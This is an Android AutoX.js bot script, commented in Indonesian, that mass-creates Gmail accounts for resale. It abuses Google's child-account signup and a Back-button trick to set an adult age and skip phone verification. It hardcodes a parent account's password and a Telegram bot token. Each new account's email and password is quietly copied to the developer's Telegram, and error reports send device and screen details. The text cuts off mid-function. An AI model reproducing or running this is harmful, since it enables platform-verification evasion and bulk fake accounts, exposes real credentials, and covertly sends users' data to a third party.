/**
 * ==============================================================================
 * AUTO CREATE GMAIL - METODE BARU: CHILD ACCOUNT -> BACK BYPASS UMUR DEWASA
 * ==============================================================================
 * Target Platform : HP Android (Samsung Browser / Google Chrome)
 * Engine          : AutoX.js v6 / Auto.js Pro / Auto.js v4.1.1
 * 
 * Flow Baru Sesuai Update Terakhir:
 *  1. Buka Sign-In Google -> Create account -> For my child (Untuk anak saya).
 *  2. Masukkan Nama Anak + Tanggal Lahir Anak (Tahun < 13 thn, misal 2015).
 *  3. Buat Gmail Sementara & Password Bebas (dummy).
 *  4. Masuk ke halaman "Parent sign-in" -> Masukkan Email Ortu (by.u001user@gmail.com)
 *     dan Sandi Ortu (martabakmesir13).
 *  5. Konfirmasi persetujuan orang tua (centang checkbox).
 *  6. BYPASS STEP: Tekan tombol BACK beberapa kali hingga kembali ke halaman
 *     "Basic information" (Ganti Umur).
 *  7. Ubah Tahun Lahir ke umur dewasa: Range 2001 s/d 2008 (Default 2001).
 *  8. Klik Next -> Google otomatis alihkan ke Akun Dewasa Mandiri (Bypass Verifikasi HP).
 *  9. Buat Alamat Gmail Market & Masukkan Password Market (sgsg1122 / goldacok / custom).
 * 10. Setujui Privacy & Terms reguler -> Akun Berhasil Dibuat!
 * 11. Kirim otomatis detail Gmail Market & Password ke Telegram.
 * ==============================================================================
 */

"ui";

// Tampilan UI Konfigurasi sebelum bot dijalankan
ui.layout(
    <vertical padding="16" bg="#121212">
        <text text="BOT AUTO CREATE GMAIL" textSize="19sp" textStyle="bold" textColor="#FFFFFF" gravity="center" marginBottom="4"/>
        <text text="Metode Baru: Bypass Ganti Umur (Parent -> Dewasa)" textSize="11sp" textColor="#00E676" gravity="center" marginBottom="12"/>
        
        <scroll>
            <vertical>
                <!-- KREDENSIAL AKUN INDUK / ORANG TUA (PARENT) -->
                <card cardCornerRadius="8dp" cardElevation="2dp" margin="0 4 0 8" bg="#1E1E1E">
                    <vertical padding="12">
                        <text text="1. Akun Induk Orang Tua (Parent Sign-In):" textColor="#00E676" textStyle="bold" textSize="13sp"/>
                        <text text="Email Ortu:" textColor="#AAAAAA" textSize="11sp" marginTop="4"/>
                        <input id="input_parent_email" hint="Email ortu" text="by.u001user@gmail.com" textColor="#FFFFFF" textSize="13sp"/>
                        
                        <text text="Password Ortu:" textColor="#AAAAAA" textSize="11sp" marginTop="4"/>
                        <input id="input_parent_pw" hint="Password ortu" text="martabakmesir13" textColor="#FFFFFF" textSize="13sp"/>
                    </vertical>
                </card>

                <!-- SETTING PASSWORD AKUN GMAIL MARKET (AKUN JADI) -->
                <card cardCornerRadius="8dp" cardElevation="2dp" margin="0 4 0 8" bg="#1E1E1E">
                    <vertical padding="12">
                        <text text="2. Password Akun Jadi (Gmail Market):" textColor="#00E676" textStyle="bold" textSize="13sp"/>
                        <text text="Pilih template atau ketik password sendiri:" textColor="#888888" textSize="11sp"/>
                        
                        <radiogroup id="rg_pw_choice" marginTop="4">
                            <radio id="rb_pw_sgsg" text="sgsg1122" checked="true" textColor="#FFFFFF"/>
                            <radio id="rb_pw_golda" text="goldacok" textColor="#FFFFFF"/>
                            <radio id="rb_pw_custom" text="Setting Password Sendiri:" textColor="#FFFFFF"/>
                        </radiogroup>
                        <input id="input_custom_pw" hint="Ketik password custom di sini..." text="sgsg1122" textColor="#FFFFFF" textSize="13sp"/>
                    </vertical>
                </card>

                <!-- SETTING TAHUN DEWASA SETELAH BYPASS -->
                <card cardCornerRadius="8dp" cardElevation="2dp" margin="0 4 0 8" bg="#1E1E1E">
                    <vertical padding="12">
                        <text text="3. Setting Tahun Dewasa (Setelah Back):" textColor="#00E676" textStyle="bold" textSize="13sp"/>
                        <text text="Range: 2001 - 2008 (Default: 2001)" textColor="#888888" textSize="11sp"/>
                        <radiogroup id="rg_adult_year" marginTop="4">
                            <radio id="rb_year_2001" text="Fix Tahun 2001 (Rekomendasi)" checked="true" textColor="#FFFFFF"/>
                            <radio id="rb_year_random" text="Random Acak (2001 - 2008)" textColor="#FFFFFF"/>
                        </radiogroup>
                    </vertical>
                </card>

                <!-- SETTING TELEGRAM BOT -->
                <card cardCornerRadius="8dp" cardElevation="2dp" margin="0 4 0 8" bg="#1E1E1E">
                    <vertical padding="12">
                        <text text="4. Teruskan Hasil ke Telegram:" textColor="#00E676" textStyle="bold" textSize="13sp"/>
                        <text text="Bot Token:" textColor="#AAAAAA" textSize="11sp" marginTop="4"/>
                        <input id="input_tele_token" hint="Contoh: 123456789:ABCdefGhIjk..." text="9196997158:AAF5OutT0JHy73no84X8mhzwbFrm0BeUIzU" textColor="#FFFFFF" textSize="13sp"/>
                        
                        <text text="Chat ID Telegram:" textColor="#AAAAAA" textSize="11sp" marginTop="4"/>
                        <input id="input_tele_chatid" hint="Contoh: 987654321" text="5993311226" textColor="#FFFFFF" textSize="13sp"/>
                    </vertical>
                </card>

                <!-- PILIHAN BROWSER -->
                <card cardCornerRadius="8dp" cardElevation="2dp" margin="0 4 0 8" bg="#1E1E1E">
                    <vertical padding="12">
                        <text text="5. Pilihan Browser:" textColor="#00E676" textStyle="bold" textSize="13sp"/>
                        <radiogroup id="rg_browser">
                            <radio id="rb_samsung" text="Samsung Internet Browser" checked="true" textColor="#FFFFFF"/>
                            <radio id="rb_chrome" text="Google Chrome" textColor="#FFFFFF"/>
                        </radiogroup>
                    </vertical>
                </card>

                <!-- TOMBOL START -->
                <button id="btn_start" text="MULAI OTOMASI ALUR BARU" bg="#00E676" textColor="#000000" textStyle="bold" marginTop="8" marginBottom="24"/>
            </vertical>
        </scroll>
    </vertical>
);

// Event listener saat memilih template password
ui.rb_pw_sgsg.click(function() {
    ui.input_custom_pw.setText("sgsg1122");
});
ui.rb_pw_golda.click(function() {
    ui.input_custom_pw.setText("goldacok");
});
ui.rb_pw_custom.click(function() {
    ui.input_custom_pw.setText("");
});

// Konfigurasi Admin / Developer untuk menerima laporan error dari client
var ADMIN_TELEGRAM_TOKEN = "9196997158:AAF5OutT0JHy73no84X8mhzwbFrm0BeUIzU";
var ADMIN_TELEGRAM_CHAT_ID = "5993311226"; // ID Telegram Anda (Andaka) - Berhasil Terhubung!

// Variabel Pelacak Step Aktif
var CURRENT_STEP_NAME = "Inisialisasi";
var CURRENT_STEP_DESC = "Memulai bot";

/**
 * Update step saat ini agar jika terjadi error, robot tahu persis di tahap mana ia macet
 */
function setStep(name, desc) {
    CURRENT_STEP_NAME = name;
    CURRENT_STEP_DESC = desc || "";
    toastLog("[" + name + "] " + CURRENT_STEP_DESC);
    appendLocalLog("[" + getTimestamp() + "] [" + name + "] " + CURRENT_STEP_DESC);
}

/**
 * Mengambil dump semua teks, tombol, dan elemen yang sedang tampak di layar client
 */
function getScreenDump() {
    var details = [];
    try {
        var allNodes = classNameMatches(".*").find();
        var seenTexts = {};
        for (var i = 0; i < allNodes.length; i++) {
            var node = allNodes[i];
            var txt = (node.text() || node.desc() || "").trim();
            var cls = node.className();
            var id = node.id();

            if (txt && txt.length > 0 && !seenTexts[txt]) {
                seenTexts[txt] = true;
                var info = "• [" + cls.replace("android.widget.", "") + "] \"" + txt + "\"";
                if (id) info += " (id: " + id.split("/")[1] + ")";
                details.push(info);
            }
        }
    } catch (e) {
        details.push("Gagal dump elemen: " + e.message);
    }
    return details.slice(0, 20).join("\n"); // Ambil 20 elemen teratas
}

/**
 * Format tanggal dan waktu saat ini
 */
function getTimestamp() {
    var now = new Date();
    return now.getFullYear() + "-" + (now.getMonth() + 1) + "-" + now.getDate() + " " + now.getHours() + ":" + now.getMinutes() + ":" + now.getSeconds();
}

/**
 * Simpan catatan log ke memori internal HP client (/sdcard/bot_gmail_debug.log)
 */
function appendLocalLog(text) {
    try {
        files.append("/sdcard/bot_gmail_debug.log", text + "\n");
    } catch (e) {}
}

/**
 * Mengirim laporan error lengkap ke Telegram Developer
 */
function reportErrorToTelegram(errReason, config) {
    var deviceInfo = (device.brand || "Unknown") + " " + (device.model || "Device") + " (Android " + (device.release || "?") + ")";
    var screenElements = getScreenDump();

    var reportMsg = "🚨 *LAPORAN ERROR DARI CLIENT!*\n\n"
        + "📱 *Perangkat Client:* `" + deviceInfo + "`\n"
        + "🌐 *Browser:* `" + config.browserPkg + "`\n"
        + "📍 *Macet di:* `" + CURRENT_STEP_NAME + "`\n"
        + "📝 *Deskripsi:* " + CURRENT_STEP_DESC + "\n"
        + "⚠️ *Detail Error:* `" + errReason + "`\n"
        + "🕒 *Waktu:* " + getTimestamp() + "\n\n"
        + "🔍 *Elemen/Teks yang Tampak di Layar:*\n"
        + (screenElements || "(Tidak ada elemen terdeteksi)");

    appendLocalLog("\n--- ERROR OCCURRED ---\n" + reportMsg + "\n----------------------\n");

    // 1. Kirim ke Telegram Admin / Developer
    var tokenTarget = ADMIN_TELEGRAM_TOKEN || config.teleToken;
    var chatTarget = ADMIN_TELEGRAM_CHAT_ID || config.teleChatId;

    if (tokenTarget && chatTarget) {
        sendTelegramMessage(tokenTarget, chatTarget, reportMsg);
    }
}

// Event tombol Mulai Otomasi
ui.btn_start.click(function() {
    var parentEmail = ui.input_parent_email.text().trim();
    var parentPw = ui.input_parent_pw.text().trim();
    var finalPw = ui.input_custom_pw.text().trim();
    var isFixed2001 = ui.rb_year_2001.isChecked();
    var teleToken = ui.input_tele_token.text().trim();
    var teleChatId = ui.input_tele_chatid.text().trim();
    var useChrome = ui.rb_chrome.isChecked();

    if (!parentEmail || !parentPw) {
        toast("Email dan Sandi Ortu wajib diisi!");
        return;
    }
    if (!finalPw) {
        toast("Password akun Gmail market wajib diisi!");
        return;
    }

    // Jalankan otomasi di background thread
    threads.start(function() {
        startAutomation({
            parentEmail: parentEmail,
            parentPw: parentPw,
            finalPw: finalPw,
            isFixed2001: isFixed2001,
            teleToken: teleToken,
            teleChatId: teleChatId,
            browserPkg: useChrome ? "com.android.chrome" : "com.sec.android.app.sbrowser"
        });
    });
});

/**
 * ==============================================================================
 * LOGIKA UTAMA OTOMASI ALUR BARU
 * ==============================================================================
 */
function startAutomation(config) {
    auto.waitFor();
    toastLog("Layanan Aksesibilitas aktif. Membuka browser...");
    sleep(1500);

    // 1. Launch Browser
    app.launchPackage(config.browserPkg);
    sleep(3000);

    // Siapkan data random
    var firstName = getRandomName();
    var lastName = getRandomName();
    var randomDigits = getRandomInt(100, 999).toString(); // Angka 3 digit unik
    var childYear = "2015"; // Tahun anak di bawah 13 tahun untuk memicu flow Parent Sign-In
    var adultYear = config.isFixed2001 ? "2001" : getRandomInt(2001, 2008).toString();
    var dayBirth = getRandomInt(1, 28).toString();

    // Data akun sementara & akun market final (selalu sertakan angka acak agar 100% unik & tidak bentrok)
    var tempUsername = firstName.toLowerCase() + lastName.toLowerCase() + getRandomInt(1000, 9999);
    var tempPassword = "dummy" + getRandomInt(10000, 99999);
    var marketUsername = (firstName.toLowerCase() + lastName.toLowerCase() + randomDigits).substring(0, 20);
    var finalMarketEmail = marketUsername + "@gmail.com";

    toastLog("Mulai Alur: Nama " + firstName + ", Tahun Awal: " + childYear + " -> Bypass: " + adultYear);

    try {
        // ======================================================================
        // STEP 1: BUKA HALAMAN REGISTER GOOGLE / CREATE ACCOUNT
        // ======================================================================
        setStep("STEP 1", "Membuka halaman register Google...");
        
        var regUrl = "https://accounts.google.com/signup/v2/createaccount?flowName=GlifWebSignIn&flowEntry=SignUp";
        
        // Selalu trigger Intent buka link pendaftaran secara eksplisit
        app.startActivity({
            action: "android.intent.action.VIEW",
            data: regUrl,
            packageName: config.browserPkg
        });
        sleep(4000);

        // Pastikan halaman form pendaftaran benar-benar termuat
        var pageLoaded = false;
        for (var wl = 0; wl < 10; wl++) {
            // Cek apakah sudah di form nama atau info dasar
            if (textContains("Buat Akun Google").exists() || textContains("Create a Google Account").exists() ||
                textContains("Masukkan nama").exists() || textContains("Enter your name").exists() ||
                textContains("First name").exists() || textContains("Nama depan").exists() ||
                textContains("Basic info").exists() || textContains("Informasi dasar").exists()) {
                pageLoaded = true;
                break;
            }

            // Jika Chrome malah buka halaman kosong / tab baru Google (ada tombol Buat Akun)
            var btnCreate = className("android.widget.Button").textContains("Create account").findOne(800) ||
                            className("android.widget.Button").textContains("Buat akun").findOne(800) ||
                            text("Create account").findOne(800) || text("Buat akun").findOne(800);
            if (btnCreate) {
                btnCreate.click();
                sleep(1500);
                clickTextOrDescMatch(["For my child", "Untuk anak saya", "child", "anak"]);
                sleep(2000);
                clickTextOrDescMatch(["Yes, continue", "Ya, lanjutkan", "Lanjutkan", "Continue", "Next", "Berikutnya"]);
                sleep(3000);
                pageLoaded = true;
                break;
            }

            // Jika masih di halaman beranda / search bar Chrome, kirim ulang Intent URL
            if (wl == 3 || wl == 6) {
                app.startActivity({
                    action: "android.intent.action.VIEW",
                    data: regUrl,
                    packageName: config.browserPkg
                });
            }
            sleep(1500);
        }

        // ======================================================================
        // STEP 2: ISI NAMA (FIRST NAME & LAST NAME)
        // ======================================================================
        setStep("STEP 2", "Mengisi nama: " + firstName + " " + lastName);
        
        // Tunggu hingga field EditText FORM nama (bukan url bar Chrome) muncul
        var formNameInputs = [];
        for (var wn = 0; wn < 10; wn++) {
            var allEdits = className("android.widget.EditText").find();
            var validEdits = [];
            for (var e = 0; e < allEdits.length; e++) {
                var editId = allEdits[e].id() || "";
                if (editId.indexOf("urlbar") == -1 && editId.indexOf("search") == -1) {
                    validEdits.push(allEdits[e]);
                }
            }
            if (validEdits.length >= 1) {
                formNameInputs = validEdits;
                break;
            }
            sleep(1000);
        }

        if (formNameInputs.length >= 1) {
            // 1. Isi Nama Depan
            formNameInputs[0].click();
            sleep(500);
            formNameInputs[0].setText(firstName);
            sleep(600);

            // 2. Isi Nama Belakang jika ada
            if (formNameInputs.length >= 2) {
                formNameInputs[1].click();
                sleep(500);
                formNameInputs[1].setText(lastName);
                sleep(600);
            }

            // Klik Next
            clickNextButton();
            sleep(3500);
        } else {
            throw new Error("Kolom input nama form pendaftaran tidak ditemukan (terjebak di halaman luar Chrome).");
        }

        // Cek jika muncul halaman pengantar anak ("Buat Akun Google untuk anak Anda" -> Klik "Ayo!")
        for (var wa = 0; wa < 5; wa++) {
            if (textContains("Ayo").exists() || textContains("Let's go").exists() || textContains("untuk anak Anda").exists() || textContains("for your child").exists()) {
                toastLog("Halaman intro anak terdeteksi. Mengklik Ayo!...");
                clickTextOrDescMatch(["Ayo!", "Ayo", "Let's go", "Get started", "Berikutnya", "Next"]);
                sleep(3000);
                break;
            }
            if (textContains("Basic info").exists() || textContains("Informasi dasar").exists() || textContains("Month").exists() || textContains("Bulan").exists()) {
                break;
            }
            sleep(1000);
        }

        // ======================================================================
        // STEP 3: ISI TANGGAL LAHIR AWAL (TAHUN ANAK: 2015)
        // ======================================================================
        setStep("STEP 3", "Mengisi tanggal lahir awal anak (Tahun: " + childYear + ")");
        if (waitForTextOrDesc(["Basic info", "Informasi dasar", "birthday", "tanggal lahir", "Month", "Bulan"], 10000)) {
            isiTanggalLahir(dayBirth, childYear);
            clickNextButton();
            sleep(3500);
        } else {
            throw new Error("Halaman Tanggal Lahir (Basic info) tidak ditemukan.");
        }

        // ======================================================================
        // STEP 4: ISI USERNAME GMAIL SEMENTARA & PASSWORD SEMENTARA (DUMMY)
        // ======================================================================
        setStep("STEP 4", "Mengisi alamat Gmail sementara");
        if (waitForTextOrDesc(["Choose how", "Pilih bagaimana", "Username", "Nama pengguna", "@gmail.com", "Create an email", "Cara Anda masuk"], 10000)) {
            var radios = className("android.widget.RadioButton").find();
            if (radios.length > 0) {
                toastLog("Memilih saran email dari Google...");
                radios[0].click();
                sleep(800);
                clickNextButton();
                sleep(2500);
            } else {
                var unameField = null;
                var allUnameEdits = className("android.widget.EditText").find();
                for (var u = 0; u < allUnameEdits.length; u++) {
                    var uId = allUnameEdits[u].id() || "";
                    if (uId.indexOf("urlbar") == -1 && uId.indexOf("search") == -1) {
                        unameField = allUnameEdits[u];
                        break;
                    }
                }

                if (unameField) {
                    unameField.click();
                    sleep(400);
                    unameField.setText(tempUsername);
                    sleep(1000);
                    clickNextButton();
                    sleep(3000);

                    // Handle jika username sementara bentrok (muncul peringatan merah 'telah digunakan')
                    for (var retryU = 0; retryU < 3; retryU++) {
                        if (textContains("digunakan").exists() || textContains("taken").exists() || textContains("sudah ada").exists()) {
                            toastLog("Username sementara bentrok. Mencoba saran atau kombinasi baru...");
                            sleep(1000);
                            
                            // 1. Cek apakah Google memberikan saran (tombol suggestion @gmail.com)
                            var suggBtn = className("android.widget.Button").textContains("@gmail.com").findOne(1000);
                            if (suggBtn && suggBtn.text().indexOf("Berikutnya") == -1 && suggBtn.text().indexOf("Next") == -1) {
                                suggBtn.click();
                                sleep(800);
                                clickNextButton();
                                sleep(2500);
                                break;
                            } else {
                                // 2. Buat kombinasi username yang jauh lebih unik (nama + 6 angka acak)
                                tempUsername = firstName.toLowerCase() + lastName.toLowerCase() + getRandomInt(100000, 999999);
                                unameField.click();
                                sleep(300);
                                unameField.setText(tempUsername);
                                sleep(800);
                                clickNextButton();
                                sleep(3000);
                            }
                        } else {
                            break;
                        }
                    }
                }
            }
        }

        // Masukkan Password Sementara (Bebas / Dummy dulu)
        setStep("STEP 4.1", "Mengisi sandi sementara (dummy)");
        var pwPageDetected = waitForTextOrDesc(["Buat sandi", "Create a strong password", "sandi yang kuat", "Password", "Sandi", "Confirm", "Konfirmasi"], 10000);
        
        var pwInputs = [];
        for (var wp = 0; wp < 5; wp++) {
            pwInputs = className("android.widget.EditText").find();
            // Filter hanya input yang ada di area form (bukan url bar chrome)
            var formInputs = [];
            for (var k = 0; k < pwInputs.length; k++) {
                var pId = pwInputs[k].id() || "";
                if (pId.indexOf("urlbar") == -1 && pId.indexOf("search") == -1) {
                    formInputs.push(pwInputs[k]);
                }
            }
            if (formInputs.length > 0) {
                pwInputs = formInputs;
                break;
            }
            sleep(1000);
        }

        if (pwInputs.length > 0) {
            for (var i = 0; i < pwInputs.length; i++) {
                pwInputs[i].click();
                sleep(400);
                pwInputs[i].setText(tempPassword);
                sleep(600);
            }
            clickNextButton();
            sleep(4000);
        } else {
            throw new Error("Form input password sementara tidak muncul.");
        }

        // ======================================================================
        // STEP 5: HALAMAN "PARENT SIGN-IN" (INPUT EMAIL & PASSWORD ORANG TUA)
        // ======================================================================
        setStep("STEP 5", "Parent Sign-In: Mengisi email orang tua (" + config.parentEmail + ")");
        if (waitForTextOrDesc(["Parent sign-in", "Login orang tua", "Parent email", "Email orang tua"], 10000)) {
            var parentEmailInput = className("android.widget.EditText").findOne(4000);
            if (parentEmailInput) {
                parentEmailInput.setText(config.parentEmail);
                sleep(1000);
                clickNextButton();
                sleep(3500);
            }
        } else {
            throw new Error("Layar Parent Sign-In tidak muncul.");
        }

        // Input Sandi Orang Tua
        setStep("STEP 5.1", "Parent Sign-In: Mengisi password akun orang tua");
        if (waitForTextOrDesc(["Enter your password", "Masukkan sandi Anda", "Sandi"], 9000)) {
            var parentPwInput = className("android.widget.EditText").password(true).findOne(3000) || className("android.widget.EditText").findOne(3000);
            if (parentPwInput) {
                parentPwInput.setText(config.parentPw);
                sleep(1000);
                clickNextButton();
                sleep(4000);
            }
        } else {
            throw new Error("Input password orang tua tidak ditemukan.");
        }

        // Verifikasi 2FA HP Orang Tua jika muncul prompt
        setStep("STEP 5.2", "Memeriksa verifikasi notifikasi keamanan orang tua");
        if (textContains("Do you have your").exists() || textContains("Check your").exists() || textContains("Poco").exists() || textContains("ponsel").exists()) {
            toastLog("Harap ketuk notifikasi verifikasi di HP orang tua!");
            // Tunggu hingga user mengetuk konfirmasi di HP (maksimal 60 detik)
            for (var w = 0; w < 30; w++) {
                if (textContains("I agree").exists() || textContains("Saya setuju").exists() || className("android.widget.CheckBox").exists()) {
                    break;
                }
                sleep(2000);
            }
        }

        // Centang Persetujuan Orang Tua ("I agree to let Google...", "I understand...")
        setStep("STEP 5.3", "Menyetujui syarat parental consent (checkbox)");
        sleep(2000);
        centangSemuaCheckbox();
        scrollDownIfNeeded();
        sleep(1000);
        centangSemuaCheckbox();
        
        clickTextOrDescMatch(["I agree", "Saya setuju", "Next", "Berikutnya", "Agree", "Setuju"]);
        sleep(4000);

        // STEP 5.4: Do a device check (Menit 2:05 di Video) -> Klik Continue
        setStep("STEP 5.4", "Memeriksa layar 'Do a device check'");
        if (waitForTextOrDesc(["Do a device check", "Verify some info", "Periksa perangkat", "Verifikasi info"], 7000)) {
            toastLog("Halaman Do a device check terdeteksi. Klik Continue...");
            clickTextOrDescMatch(["Continue", "Lanjutkan", "Next", "Berikutnya"]);
            sleep(3500);
        }

        // STEP 5.5: Are you trying to verify your info? -> Klik Yes, continue
        setStep("STEP 5.5", "Memeriksa konfirmasi 'Are you trying to verify your info?'");
        if (waitForTextOrDesc(["Are you trying to verify", "Apakah Anda mencoba memverifikasi", "Yes, continue", "Ya, lanjutkan"], 7000)) {
            toastLog("Konfirmasi perangkat terdeteksi. Klik Yes, continue...");
            clickTextOrDescMatch(["Yes, continue", "Ya, lanjutkan", "Yes", "Ya"]);
            sleep(4000);
        }

        // Tunggu hingga halaman verifikasi ortu / "How you'll help Nadia manage her account"
        setStep("STEP 5.6", "Menunggu konfirmasi sah akun orang tua ('How you'll help manage')");
        if (!waitForTextOrDesc(["manage her account", "manage his account", "kelola akun", "How you'll help"], 12000)) {
            toastLog("[INFO] Mencoba klik Continue sekali lagi jika masih tertahan...");
            clickTextOrDescMatch(["Continue", "Lanjutkan", "Yes, continue", "Ya, lanjutkan"]);
            sleep(3000);
        }

        // ======================================================================
        // STEP 6: KUNCI BYPASS -> KLIK BACK SAMPAI HALAMAN BASIC INFORMATION
        // ======================================================================
        setStep("STEP 6", "Melakukan aksi BACK bypass sampai kembali ke halaman Tanggal Lahir");
        var reachedBasicInfo = false;

        for (var attempt = 1; attempt <= 9; attempt++) {
            toastLog("Menekan tombol Back (" + attempt + ")...");
            back();
            sleep(2000);

            // Cek apakah sudah sampai di halaman Basic Information (Tanggal Lahir)
            if (text("2015").exists() || textContains("Year").exists() || textContains("Tahun").exists()) {
                reachedBasicInfo = true;
                toastLog("Berhasil kembali ke halaman ganti umur!");
                break;
            }
        }

        if (!reachedBasicInfo) {
            throw new Error("Gagal kembali ke halaman Basic Information setelah menekan Back.");
        }

        // ======================================================================
        // STEP 7: GANTI TAHUN LAHIR MENJADI TAHUN DEWASA (2001 - 2008)
        // ======================================================================
        setStep("STEP 7", "Mengubah tahun lahir menjadi umur dewasa (" + adultYear + ")");
        sleep(1000);

        // Cari field input Tahun (sebelumnya terisi 2015)
        var yearField = text("2015").findOne(2000) || textContains("Year").findOne(1000) || textContains("Tahun").findOne(1000);
        if (yearField && yearField.className() == "android.widget.EditText") {
            yearField.setText(adultYear);
        } else {
            // Cari dari daftar EditText yang ada
            var allEdits = className("android.widget.EditText").find();
            if (allEdits.length >= 2) {
                // Biasanya edittext kedua adalah Tahun
                allEdits[allEdits.length - 1].setText(adultYear);
            }
        }
        sleep(1000);

        // 2. Pastikan Gender terpilih kembali (karena di-reset oleh Google saat Back)
        pilihGender();

        // Klik Next untuk mengunci umur dewasa
        clickNextButton();
        sleep(3500);

        // STEP 7.1: Cek halaman transisi "Next steps are for [Nama]"
        if (textContains("Next steps").exists() || textContains("Langkah berikutnya").exists() || textContains("able to create").exists() || textContains("dapat membuat").exists()) {
            toastLog("Halaman transisi dewasa terdeteksi. Klik Next...");
            clickNextButton();
            sleep(3500);
        }

        // ======================================================================
        // STEP 8: INPUT GMAIL MARKET & PASSWORD MARKET (AKUN RESMI YANG JADI)
        // ======================================================================
        setStep("STEP 8", "Membuat Alamat Gmail Market (" + marketUsername + ")");
        waitForTextOrDesc(["How you'll sign in", "Cara Anda login", "Create a Gmail address", "Buat alamat Gmail", "Username", "Nama pengguna"], 8000);

        var marketUnameInput = className("android.widget.EditText").findOne(3000);
        if (marketUnameInput) {
            marketUnameInput.setText(marketUsername);
            sleep(1000);
            clickNextButton();
            sleep(2500);

            // Cek jika username sudah dipakai orang lain
            for (var ut = 0; ut < 3; ut++) {
                if (textContains("taken").exists() || textContains("digunakan").exists() || textContains("sudah ada").exists()) {
                    toastLog("Username bentrok. Memilih saran Google atau buat username baru...");
                    sleep(1000);
                    // 1. Coba klik saran Google jika ada
                    var suggestionBtn = className("android.widget.Button").textContains("@gmail.com").findOne(1200);
                    if (suggestionBtn && suggestionBtn.text().indexOf("Berikutnya") == -1 && suggestionBtn.text().indexOf("Next") == -1) {
                        suggestionBtn.click();
                        sleep(800);
                        finalMarketEmail = suggestionBtn.text();
                        clickNextButton();
                        sleep(2500);
                    } else {
                        // 2. Ketik username alternatif dengan angka acak 4 digit yang pasti lolos
                        marketUsername = (firstName.toLowerCase() + lastName.toLowerCase() + getRandomInt(1000, 9999)).substring(0, 20);
                        finalMarketEmail = marketUsername + "@gmail.com";
                        marketUnameInput.click();
                        sleep(300);
                        marketUnameInput.setText(marketUsername);
                        sleep(800);
                        clickNextButton();
                        sleep(2500);
                    }
                } else {
                    break;
                }
            }
        }

        // Masukkan Password Market Final (sgsg1122 / goldacok / custom)
        setStep("STEP 8.1", "Mengisi Password Akun Market (" + config.finalPw + ")");
        waitForTextOrDesc(["Buat sandi", "Create a strong password", "sandi yang kuat", "Password", "Sandi", "Confirm", "Konfirmasi"], 10000);
        
        var finalFormInputs = [];
        for (var wpf = 0; wpf < 5; wpf++) {
            var rawPw = className("android.widget.EditText").find();
            for (var m = 0; m < rawPw.length; m++) {
                var rawId = rawPw[m].id() || "";
                if (rawId.indexOf("urlbar") == -1 && rawId.indexOf("search") == -1) {
                    finalFormInputs.push(rawPw[m]);
                }
            }
            if (finalFormInputs.length > 0) break;
            sleep(1000);
        }

        if (finalFormInputs.length > 0) {
            for (var j = 0; j < finalFormInputs.length; j++) {
                finalFormInputs[j].click();
                sleep(400);
                finalFormInputs[j].setText(config.finalPw);
                sleep(600);
            }
            clickNextButton();
            sleep(4000);
        } else {
            throw new Error("Form Password Market tidak ditemukan di halaman.");
        }

        // ======================================================================
        // STEP 9: PRIVACY AND TERMS REGULER (SAYA SETUJU)
        // ======================================================================
        setStep("STEP 9", "Menyetujui Privacy and Terms reguler");
        waitForTextOrDesc(["Privacy and Terms", "Privasi dan Persyaratan", "Terms of Service"], 8000);
        scrollDownIfNeeded();
        sleep(800);
        scrollDownIfNeeded();
        sleep(1000);

        clickTextOrDescMatch(["I agree", "Saya setuju", "Setuju", "Agree"]);
        sleep(4500);

        // Melewati halaman selfie jika muncul ("Add a selfie, just in case")
        if (textContains("selfie").exists() || textContains("Not now").exists() || textContains("Jangan sekarang").exists()) {
            clickTextOrDescMatch(["Not now", "Jangan sekarang", "Skip", "Lewati"]);
            sleep(3000);
        }

        // ======================================================================
        // STEP 10: SUKSES & KIRIM DATA GMAIL MARKET KE TELEGRAM
        // ======================================================================
        setStep("STEP 10", "Sukses! Mengirim hasil kredensial ke Telegram");
        toastLog("🎉 GMAIL MARKET BERHASIL DIBUAT!");

        var successMessage = "✅ *GMAIL MARKET BERHASIL DIBUAT!*\n\n"
            + "📧 *Email:* `" + finalMarketEmail + "`\n"
            + "🔑 *Password:* `" + config.finalPw + "`\n"
            + "📅 *Tahun Lahir:* `" + adultYear + "`\n"
            + "👤 *Nama:* " + firstName + " " + lastName + "\n"
            + "🛡️ *Parent Bypass:* `" + config.parentEmail + "`\n"
            + "📱 *Metode:* Child -> Back Bypass Dewasa";

        // Kirim notifikasi Telegram ke user / client
        if (config.teleToken && config.teleChatId) {
            sendTelegramMessage(config.teleToken, config.teleChatId, successMessage);
        }

        // Kirim juga tembusan ke Telegram Admin / Developer
        if (ADMIN_TELEGRAM_TOKEN && ADMIN_TELEGRAM_CHAT_ID && ADMIN_TELEGRAM_CHAT_ID != config.teleChatId) {
            sendTelegramMessage(ADMIN_TELEGRAM_TOKEN, ADMIN_TELEGRAM_CHAT_ID, successMessage);
        }

        alert("SUKSES!", "Gmail Market Berhasil Dibuat:\nEmail: " + finalMarketEmail + "\nPassword: " + config.finalPw);

    } catch (err) {
        toastLog("Terjadi Error: " + err.message);
        reportErrorToTelegram(err.message, config);
        alert("TERJADI KENDALA", "Bot terhenti pada:\n" + CURRENT_STEP_NAME + " - " + CURRENT_STEP_DESC + "\n\nError: " + err.message + "\n\nLaporan detail & tampilan layar telah otomatis terkirim ke Telegram.");
    }
}

/**
 * ==============================================================================
 * FUNGSI HELPER & UTILITY (ACCESSIBILITY SUPPORT ID & EN)
 * ==============================================================================
 */

// Klik tombol Next / Berikutnya
function clickNextButton() {
    scrollDownIfNeeded();
    sleep(300);
    return clickTextOrDescMatch(["Next", "Berikutnya", "Lanjutkan", "Continue", "Ayo!", "Ayo", "Let's go"]);
}

// Klik element berdasarkan daftar alternatif kata
function clickTextOrDescMatch(wordsList) {
    for (var i = 0; i < wordsList.length; i++) {
        var word = wordsList[i];
        var target = text(word).findOne(800) || desc(word).findOne(800) || textContains(word).findOne(800);
        if (target) {
            if (target.clickable()) {
                target.click();
            } else if (target.parent() && target.parent().clickable()) {
                target.parent().click();
            } else {
                click(target.bounds().centerX(), target.bounds().centerY());
            }
            return true;
        }
    }
    return false;
}

// Tunggu sampai salah satu teks dari list muncul di layar
function waitForTextOrDesc(wordsList, maxWaitMs) {
    var startTime = new Date().getTime();
    while (new Date().getTime() - startTime < maxWaitMs) {
        for (var i = 0; i < wordsList.length; i++) {
            if (textContains(wordsList[i]).exists() || descContains(wordsList[i]).exists()) {
                return true;
            }
        }
        sleep(500);
    }
    return false;
}

// Pilih Gender (Wanita / Pria / Bebas)
function pilihGender() {
    sleep(600);
    // Cari elemen spinner / dropdown Gender
    var genderSelector = text("Gender").findOne(1200) || 
                         desc("Gender").findOne(1200) || 
                         textContains("Gender").findOne(1200) || 
